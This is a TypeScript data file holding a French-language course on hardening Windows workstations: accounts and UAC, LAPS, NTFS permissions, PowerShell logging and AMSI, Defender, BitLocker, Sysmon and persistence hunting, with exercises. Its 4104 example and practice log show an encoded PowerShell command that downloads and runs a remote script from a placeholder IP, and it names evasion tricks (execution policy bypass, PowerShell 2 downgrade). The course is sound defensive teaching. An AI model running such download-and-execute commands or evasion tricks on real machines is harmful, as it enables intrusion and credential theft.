import type { CourseBody } from '../../types';
import { questions } from './questions';

export const body: CourseBody = {
  courseId: 'd-windows-poste-durcissement',
  lesson: {
    intro:
      'Le poste de travail Windows est la porte d’entrée la plus fréquente des attaques : une pièce jointe ouverte, une macro, un script téléchargé. La plupart des protections nécessaires sont déjà présentes dans le système, encore faut-il les activer, les régler et produire des journaux qui permettent de comprendre ce qui s’est passé. Ce cours parcourt ces protections couche par couche, du compte utilisateur jusqu’à la journalisation.',
    sections: [
      {
        id: 'comptes',
        title: 'Comptes, jetons et UAC',
        blocks: [
          { t: 'p', text: 'Chaque processus Windows s’exécute avec un **jeton d’accès** qui porte l’identité de l’utilisateur (son SID), ses groupes et ses privilèges. C’est ce jeton que le système compare aux permissions de chaque objet (fichier, clé de registre, service).' },
          { t: 'def', term: 'UAC (contrôle de compte d’utilisateur)', text: 'Un administrateur ouvre une session avec **deux jetons** : un jeton filtré, sans droits d’administration, utilisé par défaut, et un jeton complet utilisé seulement après une demande d’élévation. L’UAC est une barrière de confort et de réduction des risques ; Microsoft ne la considère pas comme une frontière de sécurité.' },
          {
            t: 'table',
            head: ['Situation', 'Risque', 'Mesure'],
            rows: [
              ['L’utilisateur travaille avec un compte administrateur local', 'Un malware lancé par l’utilisateur peut s’élever et désactiver les protections', 'Compte standard au quotidien, compte d’administration séparé'],
              ['Même mot de passe d’administrateur local sur tous les postes', 'Un poste compromis donne accès à tous les autres (mouvement latéral)', 'Mot de passe unique et renouvelé (Windows LAPS)'],
              ['Mémoire de LSASS lisible par un processus administrateur', 'Vol d’empreintes et de tickets (Mimikatz)', 'Protection LSA (RunAsPPL), Credential Guard'],
            ],
          },
          { t: 'def', term: 'Windows LAPS', text: 'Fonction qui donne à chaque poste un mot de passe d’**administrateur local aléatoire**, renouvelé automatiquement et stocké dans l’annuaire (Active Directory ou Entra ID) à l’usage des seuls ayants droit. Un poste compromis ne donne plus accès aux autres.' },
          { t: 'def', term: 'Protection LSA et Credential Guard', text: 'Le processus **LSASS** conserve en mémoire des secrets d’authentification. La protection LSA (RunAsPPL) empêche un processus non approuvé de le lire ; **Credential Guard** place ces secrets dans un conteneur isolé par virtualisation. Les deux compliquent le vol d’identifiants, de même qu’éviter les ouvertures de session privilégiées sur les postes ordinaires.' },
          { t: 'callout', kind: 'key', text: 'Retirer les droits d’administration local aux utilisateurs est, à elle seule, l’une des mesures les plus efficaces : beaucoup de techniques d’attaque sur le poste supposent ces droits.' },
        ],
      },
      {
        id: 'ntfs',
        title: 'Permissions NTFS et icacls',
        blocks: [
          { t: 'p', text: 'Sur NTFS, chaque fichier et dossier porte une **liste de contrôle d’accès** (DACL) composée d’entrées (ACE) qui autorisent ou refusent des droits à des comptes ou des groupes. Les permissions s’**héritent** par défaut du dossier parent.' },
          { t: 'code', lang: 'text', caption: 'Lire puis corriger les permissions d’un dossier de scripts', code: 'C:\\> icacls C:\\Scripts\nC:\\Scripts BUILTIN\\Utilisateurs:(OI)(CI)(M)\n           BUILTIN\\Administrateurs:(OI)(CI)(F)\n           AUTORITE NT\\Système:(OI)(CI)(F)\n\n:: Les utilisateurs peuvent MODIFIER les scripts : dangereux si une tâche planifiée\n:: les exécute avec un compte privilégié.\nC:\\> icacls C:\\Scripts /remove:g "BUILTIN\\Utilisateurs"\nC:\\> icacls C:\\Scripts /grant "BUILTIN\\Utilisateurs:(OI)(CI)RX"' },
          {
            t: 'table',
            caption: 'Abréviations icacls',
            head: ['Code', 'Signification'],
            rows: [['F', 'Contrôle total'], ['M', 'Modification (lecture, écriture, suppression)'], ['RX', 'Lecture et exécution'], ['(OI) / (CI)', 'Héritage vers les fichiers / vers les sous-dossiers'], ['/inheritance:r', 'Supprime les permissions héritées du parent']],
          },
          { t: 'callout', kind: 'warn', text: 'Le même raisonnement vaut pour les **chemins des services et des tâches** : si un programme lancé en SYSTEM se trouve dans un dossier que les utilisateurs peuvent modifier, un utilisateur peut le remplacer et obtenir les droits du compte du service.' },
          { t: 'def', term: 'Refus explicite', text: 'Une ACE de refus l’emporte sur une autorisation de même niveau. Les refus se gèrent difficilement : on préfère ne pas accorder le droit plutôt que de le refuser ensuite.' },
        ],
      },
      {
        id: 'powershell',
        title: 'PowerShell : outil d’administration et d’attaque',
        blocks: [
          { t: 'p', text: 'PowerShell donne un accès complet au système et à .NET : c’est l’outil des administrateurs, et pour la même raison l’un des plus utilisés par les attaquants (« living off the land »). Le bloquer complètement est rarement possible ; on le **rend observable** et on le **restreint**.' },
          { t: 'diagram', id: 'attack-chain', caption: 'Chaîne d’attaque typique partant d’une macro Office, et la parade qui coupe chaque étape : aucune mesure n’est suffisante seule, mais ensemble elles brisent la chaîne.', alt: 'Schéma d’une chaîne d’attaque Word vers PowerShell vers téléchargement vers persistance vers accès LSASS, avec sous chaque étape la défense correspondante : règle ASR, langage restreint, filtrage proxy, contrôle d’applications, protection LSA.' },
          { t: 'callout', kind: 'warn', title: 'La stratégie d’exécution n’est pas une protection', text: 'La documentation Microsoft le précise : la stratégie d’exécution (`Set-ExecutionPolicy`) n’est pas une frontière de sécurité, seulement une défense en profondeur qui évite surtout d’exécuter un script par mégarde. Elle se contourne trivialement (`powershell -ExecutionPolicy Bypass`, copier-coller du contenu). Elle ne remplace ni la journalisation ni le contrôle des applications.' },
          {
            t: 'table',
            head: ['Mesure', 'Effet'],
            rows: [
              ['Journalisation des blocs de script', 'Enregistre le code réellement exécuté, **après** désobfuscation, dans `Microsoft-Windows-PowerShell/Operational` (événement **4104**)'],
              ['Journalisation des modules (4103) et transcription', 'Trace les commandes et leurs sorties'],
              ['Mode de langage restreint', 'Imposé par App Control for Business (WDAC) ou AppLocker : bloque l’accès direct à .NET et aux API Windows pour les scripts non approuvés'],
              ['Suppression du moteur PowerShell 2.0', 'Cette ancienne version ne connaît pas la journalisation des blocs de script : un attaquant peut l’invoquer pour échapper aux traces'],
            ],
          },
          { t: 'def', term: 'AMSI', text: 'Interface d’analyse anti-programmes malveillants : PowerShell, Office et d’autres applications soumettent à Defender (ou à un autre antimalware) le contenu d’un script ou d’une macro **juste avant son exécution**, y compris après désobfuscation en mémoire. Elle compense l’absence de fichier d’une attaque exécutée en mémoire.' },
          { t: 'p', text: 'Un attaquant peut lancer `powershell -version 2` : l’ancien moteur ignore à la fois l’AMSI et la journalisation des blocs de script. Retirer cette fonctionnalité Windows des postes ferme cette voie de rétrogradation.' },
          {
            t: 'example',
            title: 'Ce que révèle l’événement 4104',
            blocks: [
              { t: 'code', lang: 'text', code: 'Ligne de commande vue par le processus :\npowershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\n\nÉvénement 4104 (bloc de script décodé) :\nIEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.7/a.ps1\')' },
              { t: 'p', text: 'La commande encodée en Base64 masque son intention ; la journalisation des blocs de script montre le téléchargement puis l’exécution en mémoire d’un script distant. Cet événement, l’adresse et le processus parent (souvent Word ou Outlook) suffisent à ouvrir un incident.' },
            ],
          },
        ],
      },
      {
        id: 'protections',
        title: 'Protections intégrées : Defender, pare-feu, BitLocker',
        blocks: [
          { t: 'list', items: ['**Microsoft Defender Antivirus** avec la **protection contre les falsifications** activée : un processus, même administrateur, ne peut plus désactiver la protection en temps réel.', '**Règles de réduction de la surface d’attaque (ASR)** : par exemple, empêcher les applications Office de créer des processus enfants, bloquer le vol d’identifiants dans `lsass.exe`, bloquer le contenu exécutable reçu par courriel. Elles se déploient d’abord en mode **audit**, puis en mode **blocage**.', '**Pare-feu Windows** : trois profils (domaine, privé, public). Le profil public s’applique sur un réseau inconnu et doit refuser toutes les connexions entrantes.', '**BitLocker** : chiffrement du disque, clé protégée par le TPM.'] },
          {
            t: 'table',
            head: ['Profil du pare-feu', 'S’applique à', 'Réglage attendu'],
            rows: [
              ['**Domaine**', 'Réseau où le poste a joint son contrôleur de domaine', 'Règles de l’entreprise, entrant filtré'],
              ['**Privé**', 'Réseau jugé de confiance (domicile)', 'Entrant filtré, partage limité'],
              ['**Public**', 'Réseau inconnu (café, hôtel, gare)', 'Aucune connexion entrante, partage et découverte désactivés'],
            ],
          },
          { t: 'p', text: 'Par défaut, le pare-feu Windows bloque le trafic entrant non sollicité et **autorise le trafic sortant** : un filtrage sortant strict est possible, mais demande une politique de règles précise.' },
          { t: 'def', term: 'TPM (module de plateforme sécurisée)', text: 'Composant qui stocke des clés et ne les libère que si la chaîne de démarrage mesurée n’a pas été modifiée. Avec BitLocker en mode **TPM seul**, le disque se déverrouille automatiquement au démarrage ; en mode **TPM + code PIN**, il faut en plus un code, ce qui protège mieux un portable volé contre certaines attaques physiques.' },
          { t: 'callout', kind: 'tip', text: 'La clé de récupération BitLocker doit être sauvegardée dans l’annuaire (Active Directory ou Entra ID) **avant** le chiffrement : sans elle, une mise à jour du micrologiciel ou un changement de carte mère peut rendre les données irrécupérables.' },
        ],
      },
      {
        id: 'journaux',
        title: 'Journaux Windows et Sysmon',
        blocks: [
          { t: 'p', text: 'Par défaut, Windows journalise peu de choses utiles à la détection. Deux réglages changent tout : l’audit de **création de processus avec ligne de commande** (événement de sécurité **4688**) et **Sysmon**, outil gratuit de la suite Sysinternals qui produit des événements détaillés.' },
          {
            t: 'table',
            caption: 'Événements Sysmon les plus utilisés',
            head: ['ID', 'Événement', 'Usage en détection'],
            rows: [
              ['1', 'Création de processus (avec empreinte et processus parent)', 'Office qui lance PowerShell, binaire lancé depuis un dossier temporaire'],
              ['3', 'Connexion réseau', 'Processus inattendu qui contacte Internet'],
              ['7', 'Chargement d’une image (DLL)', 'Chargement de DLL non signée par un processus système'],
              ['8', 'Création de thread distant', 'Injection de code dans un autre processus'],
              ['10', 'Accès à un processus', 'Ouverture de `lsass.exe` en lecture : vol d’identifiants'],
              ['11', 'Création de fichier', 'Dépôt d’exécutables ou de scripts'],
              ['13', 'Modification d’une valeur de registre', 'Persistance via les clés `Run`'],
              ['22', 'Requête DNS', 'Domaines contactés par chaque processus'],
            ],
          },
          {
            t: 'table',
            caption: 'Événements Windows à connaître',
            head: ['ID', 'Journal', 'Signification'],
            rows: [
              ['4624 / 4625', 'Sécurité', 'Ouverture de session réussie / échouée (le type précise interactive, réseau, RDP)'],
              ['4688', 'Sécurité', 'Création de processus (avec la ligne de commande si l’audit est activé)'],
              ['4698', 'Sécurité', 'Création d’une tâche planifiée'],
              ['4104', 'PowerShell/Operational', 'Bloc de script exécuté, après désobfuscation'],
              ['7045', 'Système', 'Installation d’un service'],
              ['1102', 'Sécurité', 'Effacement du journal de sécurité'],
            ],
          },
          { t: 'def', term: 'Configuration Sysmon', text: 'Fichier XML qui indique quoi inclure et exclure. Sans filtrage, Sysmon produit un volume ingérable ; on part d’une configuration communautaire maintenue, puis on l’adapte à son parc.' },
          { t: 'callout', kind: 'key', text: 'Des journaux qui restent sur le poste ne servent qu’après coup, et peuvent être effacés (événement 1102 côté journal de sécurité). Ils doivent être collectés en continu (Windows Event Forwarding ou agent du SIEM).' },
        ],
      },
      {
        id: 'persistance',
        title: 'Repérer la persistance sur un poste',
        blocks: [
          { t: 'p', text: 'Une fois dans un poste, l’attaquant veut y **rester** après un redémarrage ou une déconnexion : c’est la **persistance**. Les mécanismes sont peu nombreux et se contrôlent : savoir où chercher permet de nettoyer un poste sans que le problème revienne.' },
          {
            t: 'table',
            head: ['Emplacement', 'Exemple', 'Comment le lister'],
            rows: [
              ['Clés `Run` et `RunOnce` du registre', 'Un programme lancé à chaque ouverture de session', '`reg query`, Autoruns, Sysmon 13'],
              ['Dossier Démarrage', 'Un raccourci ou un script déposé dans le profil', 'Explorateur, Autoruns, Sysmon 11'],
              ['Tâches planifiées', 'Une tâche SYSTEM lancée au démarrage ou toutes les heures', '`schtasks /query /fo LIST /v`, événement 4698'],
              ['Services', 'Un service à démarrage automatique pointant vers un binaire étranger', '`sc qc nom`, événement 7045'],
              ['Abonnements WMI permanents', 'Un déclencheur qui exécute du code sur un événement', 'Autoruns, Sysmon 19 à 21'],
            ],
          },
          { t: 'code', lang: 'text', caption: 'Quelques vérifications de base', code: 'schtasks /query /fo LIST /v\nsc qc WinUpdateSvc\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nautorunsc -a * -s -h    :: tout, avec la signature et l’empreinte' },
          { t: 'def', term: 'Autoruns', text: 'Outil Sysinternals qui recense **tous** les emplacements de démarrage automatique (registre, tâches, services, pilotes, WMI…), vérifie la signature des fichiers et en calcule l’empreinte. Sa version en ligne de commande (`autorunsc`) s’intègre à un script de collecte.' },
          { t: 'def', term: 'Abonnement WMI permanent', text: 'Association (filtre, consommateur et liaison) enregistrée dans le **dépôt WMI** : un code s’exécute lorsqu’un événement se produit. Absente des clés `Run` et des tâches, elle échappe aux contrôles habituels : on la cherche avec Autoruns ou avec les événements Sysmon 19 à 21.' },
          {
            t: 'example',
            title: 'Un service qui ne ressemble pas à ceux de Windows',
            blocks: [
              { t: 'p', text: 'Le service « WinUpdateSvc » démarre automatiquement `C:\\Users\\Public\\svc.exe` avec le compte SYSTEM. Les services légitimes résident dans `C:\\Windows` ou `C:\\Program Files`, protégés en écriture : un binaire dans un dossier modifiable par tous, sous un nom qui imite Windows, est l’indice d’une installation par un attaquant.' },
            ],
          },
          { t: 'callout', kind: 'warn', title: 'Supprimer le fichier ne suffit pas', text: 'Si l’on supprime le programme mais pas la tâche, la clé ou le service qui le lance, la persistance reste : elle échoue en boucle ou relance un autre composant. On **désactive d’abord la persistance**, on collecte ce qui sert à l’analyse, puis on supprime, et on recherche les autres points d’entrée. En cas de doute sur l’étendue, on réinstalle le poste à partir d’un support sain.' },
        ],
      },
    ],
    useCases: [
      'Projet de durcissement d’un parc : comptes standard, LAPS, règles ASR en audit puis en blocage, BitLocker avec sauvegarde de la clé dans l’annuaire.',
      'SOC : déployer Sysmon et la journalisation PowerShell pour pouvoir détecter les chaînes « Office → PowerShell → téléchargement ».',
      'Audit de poste : lister les dossiers modifiables par les utilisateurs et exécutés par des comptes privilégiés.',
      'Chasse à la persistance après un incident : tâches planifiées, services, clés Run et abonnements WMI, avec Autoruns et Sysmon.',
    ],
    commonMistakes: [
      'Laisser les utilisateurs administrateurs locaux « pour éviter les tickets ».',
      'Considérer `Set-ExecutionPolicy Restricted` comme une protection contre les scripts malveillants.',
      'Activer les règles ASR directement en blocage sans phase d’audit, puis tout désactiver face aux faux positifs.',
      'Chiffrer avec BitLocker sans sauvegarder la clé de récupération.',
      'Déployer Sysmon sans configuration de filtrage, puis ne plus exploiter les journaux faute de pouvoir les lire.',
      'Supprimer le fichier malveillant sans retirer la tâche, le service ou la clé qui le relance.',
      'Laisser un programme lancé en SYSTEM dans un dossier modifiable par les utilisateurs.',
    ],
    bestPractices: [
      'Compte standard au quotidien, compte d’administration distinct, mot de passe d’administrateur local unique (LAPS).',
      'Protection LSA et Credential Guard sur les postes compatibles.',
      'Journalisation des blocs de script PowerShell, mode de langage restreint via le contrôle des applications, suppression de PowerShell 2.0.',
      'Defender avec protection contre les falsifications, règles ASR, pare-feu actif sur les trois profils.',
      'Sysmon avec une configuration maintenue, audit 4688 avec ligne de commande, collecte centrale des journaux.',
      'Inventaire régulier des points de démarrage (Autoruns) et alerte sur la création de tâches (4698) et de services (7045).',
      'Retrait de PowerShell 2.0 et contrôle de l’exécution en mémoire par l’AMSI, associée à la journalisation 4104.',
    ],
    keyPoints: [
      'Le jeton d’accès porte l’identité ; l’UAC sépare jeton filtré et jeton complet.',
      'Permissions NTFS : héritage par défaut, `icacls` pour lire et corriger.',
      'La stratégie d’exécution PowerShell n’est pas une barrière de sécurité ; l’événement 4104 montre le code réel.',
      'ASR, protection contre les falsifications, pare-feu par profil, BitLocker avec TPM : déjà présents, à activer.',
      'Sysmon : 1 processus, 3 réseau, 10 accès à un processus, 22 DNS.',
      'Persistance : Run, dossier Démarrage, tâches, services, WMI ; on retire d’abord le mécanisme, puis le fichier.',
    ],
  },
  practice: [
    {
      id: 'chaine-office',
      kind: 'analysis',
      title: 'Analyse d’une chaîne d’événements sur un poste',
      context: [
        { t: 'p', text: 'Événements Sysmon d’un poste, triés par heure :' },
        { t: 'code', lang: 'text', code: '09:14:02  ID 1   WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA...\n09:14:03  ID 22  powershell.exe → requête DNS mise-a-jour-office.example\n09:14:03  ID 3   powershell.exe → 203.0.113.7:443\n09:14:05  ID 11  powershell.exe → C:\\Users\\lea\\AppData\\Roaming\\upd.exe\n09:14:06  ID 13  powershell.exe → HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd\n09:14:09  ID 10  upd.exe → accès à lsass.exe (0x1010)' },
      ],
      steps: ['Reconstituer le scénario étape par étape.', 'Associer chaque étape à une technique ou une tactique (accès initial, exécution, persistance, accès aux identifiants).', 'Indiquer quelle mesure de durcissement aurait bloqué chaque étape.'],
    },
    {
      id: 'plan-durcissement',
      kind: 'case',
      title: 'Cas pratique : plan de durcissement d’un parc de 300 postes',
      context: [{ t: 'p', text: 'Une PME de 300 postes Windows 11 gérés par Active Directory : utilisateurs administrateurs locaux, même mot de passe d’administrateur partout, aucun chiffrement des portables, journaux non collectés.' }],
      steps: ['Proposer les mesures par ordre de priorité.', 'Pour chaque mesure, indiquer comment la déployer sans bloquer l’activité.', 'Proposer un indicateur qui montre que la mesure est en place.'],
    },
    {
      id: 'chasse-persistance',
      kind: 'analysis',
      labId: 'windows-persistence-lab',
      title: 'Analyser les points de démarrage d’un poste suspect',
      context: [
        { t: 'p', text: 'Extrait d’un inventaire de démarrage (Autoruns) d’un poste qui se recontamine après nettoyage :' },
        { t: 'code', lang: 'text', code: 'Tâche   \\Microsoft\\Windows\\UpdateCheck   SYSTEM    C:\\Users\\Public\\upd.exe     (créée à 03:12)\nRun     HKLM  OneDriveSync               Utilisateur  "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background\nService WinUpdateSvc  démarrage auto      SYSTEM    C:\\Users\\Public\\svc.exe\nDémarrage (dossier) : vide' },
      ],
      steps: ['Identifier les entrées suspectes et celles qui semblent légitimes, en justifiant.', 'Indiquer dans quel ordre agir et ce qu’il faut collecter avant de supprimer.', 'Proposer les journaux à consulter et une détection durable.'],
    },
  ],
  questions,
  resources: [
    { title: 'About Execution Policies', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_execution_policies' },
    { title: 'Attack surface reduction rules reference', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference' },
    { title: 'Sysmon', source: 'Microsoft Sysinternals', url: 'https://learn.microsoft.com/sysinternals/downloads/sysmon' },
    { title: 'Autoruns', source: 'Microsoft Sysinternals', url: 'https://learn.microsoft.com/sysinternals/downloads/autoruns' },
    { title: 'Antimalware Scan Interface (AMSI)', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/windows/win32/amsi/antimalware-scan-interface-portal' },
    { title: 'BitLocker overview', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/windows/security/operating-system-security/data-protection/bitlocker/' },
    { title: 'Recommandations relatives à l’administration sécurisée des SI', source: 'ANSSI', url: 'https://cyber.gouv.fr/publications/recommandations-relatives-ladministration-securisee-des-si' },
  ],
};
